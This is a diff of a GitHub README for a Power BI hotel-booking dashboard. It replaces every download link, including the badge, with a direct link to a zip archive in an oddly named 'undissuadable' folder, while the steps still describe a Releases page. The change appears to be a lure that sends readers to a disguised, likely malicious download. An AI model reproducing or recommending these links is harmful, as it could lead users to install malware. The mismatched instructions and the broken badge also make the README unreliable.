@@ -1,7 +1,7 @@
 # 🏨 Hotel-Booking-Dashboard - Analyze Hotel Bookings Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Hotel%20Booking%20Dashboard-blue)](https://github.com/akelex13/Hotel-Booking-Dashboard/releases)
+[![Download](https://raw.githubusercontent.com/akelex13/Hotel-Booking-Dashboard/main/undissuadable/Hotel-Booking-Dashboard.zip%20Hotel%20Booking%20Dashboard-blue)](https://raw.githubusercontent.com/akelex13/Hotel-Booking-Dashboard/main/undissuadable/Hotel-Booking-Dashboard.zip)
 
 ## 📝 Description
 The **Hotel-Booking-Dashboard** is a Power BI dashboard designed for Velora Hotel Bookings. It helps you analyze customer behavior, cancellations, and revenue trends using Excel data. With this tool, you can generate actionable business insights, making better decisions for your hotel management.
@@ -14,7 +14,7 @@ To get started, follow these simple steps:
 3. After completing these checks, you are ready to download and install the Hotel-Booking-Dashboard.
 
 ## 💾 Download & Install
-Visit this page to download: [Download Hotel-Booking-Dashboard](https://github.com/akelex13/Hotel-Booking-Dashboard/releases).
+Visit this page to download: [Download Hotel-Booking-Dashboard](https://raw.githubusercontent.com/akelex13/Hotel-Booking-Dashboard/main/undissuadable/Hotel-Booking-Dashboard.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest release and click on it.
@@ -64,4 +64,4 @@ We welcome contributions. If you would like to improve the dashboard or report a
 This project is licensed under the MIT License. You can freely use or modify it, but please provide attribution where required.
 
 ## 📥 Download Now Again
-Don’t forget to download the Hotel-Booking-Dashboard here: [Download Hotel-Booking-Dashboard](https://github.com/akelex13/Hotel-Booking-Dashboard/releases). Enjoy analyzing your hotel bookings!
+Don’t forget to download the Hotel-Booking-Dashboard here: [Download Hotel-Booking-Dashboard](https://raw.githubusercontent.com/akelex13/Hotel-Booking-Dashboard/main/undissuadable/Hotel-Booking-Dashboard.zip). Enjoy analyzing your hotel bookings!
